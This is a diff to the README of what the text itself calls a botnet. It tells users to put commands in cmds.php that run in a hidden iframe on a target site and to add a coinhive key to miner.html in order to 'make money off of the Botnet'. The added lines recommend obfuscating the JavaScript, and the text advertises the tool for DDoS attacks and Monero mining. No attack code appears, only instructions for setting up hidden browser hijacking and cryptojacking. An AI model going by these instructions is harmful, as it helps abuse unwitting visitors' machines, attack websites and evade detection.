@@ -14,7 +14,8 @@ the webpage of your choosing.
 
 3. Done, you can edit cmds.php with php commands of your choice, these will be run in a hidden iframe on
 the target site. Also, update miner.html with your coinhive Site key so you can also make money off of the 
-Botnet.
+Botnet. For added security I would recomend using a Javascript Obfuscator
+https://javascriptobfuscator.com/Javascript-Obfuscator.aspx
 
 # Use
 Can be used to conduct a DDoS Attack, it can be also used to mine Monero and preform calculations.
